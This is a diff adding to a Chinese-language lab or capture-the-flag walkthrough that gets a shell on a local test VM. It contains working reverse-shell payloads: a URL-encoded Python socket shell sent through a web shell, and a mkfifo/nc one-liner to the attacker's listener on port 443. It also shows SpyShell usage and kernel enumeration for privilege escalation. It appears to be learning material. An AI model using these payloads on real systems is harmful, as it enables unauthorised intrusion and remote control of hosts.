@@ -173,13 +173,69 @@ total 4
 * Connection #0 to host 192.168.5.136 left intact
 ```
 
-在反弹shell的时候它似乎有端口限制，443端口可以反弹shell，我们这里用python的payload
+在反弹shell的时候它似乎有端口限制，443端口可以反弹shell，我们本地监听443端口，我们这里用python2的payload
 
 ```
 http://192.168.5.136/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.5.134%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 56167
+www-data@ubuntu:/var/www/test$
 ```
 
 {% embed url="https://www.revshells.com/" %}
+
+也可以使用SpyShell这个脚本，相对比较简单，但是这个工具还是得用上nc
+
+```
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# python3 spyshell.py -u http://192.168.5.136/test/shell.php --pretty-prompt
+www-data@ubuntu$ 
+
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# python3 spyshell.py -u http://192.168.5.136/test/shell.php --pretty-prompt
+www-data@ubuntu$ rm /tmp/f;mkfifo /tmp/f;bash < /tmp/f | nc 192.168.5.134 443 > /tmp/f
+
+┌──(root㉿kali)-[~]
+└─# nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.5.134] from (UNKNOWN) [192.168.5.136] 56170
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python -c 'import pty;pty.spawn("/bin/bash")'  #升级shell
+www-data@ubuntu:/var/www/test$
+```
+
+{% embed url="https://github.com/c0dedeadio/SpyShell" %}
+
+### 权限提升
+
+查看内核版本
+
+```
+www-data@ubuntu:/$ cat /proc/version; echo ----; cat /etc/*-release
+cat /proc/version; echo ----; cat /etc/*-releasecat /proc/version; echo ----; cat /etc/*-release
+Linux version 3.11.0-15-generic (buildd@akateko) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
+----
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04.4 LTS"
+NAME="Ubuntu"
+VERSION="12.04.4 LTS, Precise Pangolin"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"
+VERSION_ID="12.04"
+```
+
+Ubuntu 12.04.4 运行内核 3.11 32 位架构。searchsploit没有找到相关的提权漏洞。
+
+
+
+
 
 [^1]: 
 
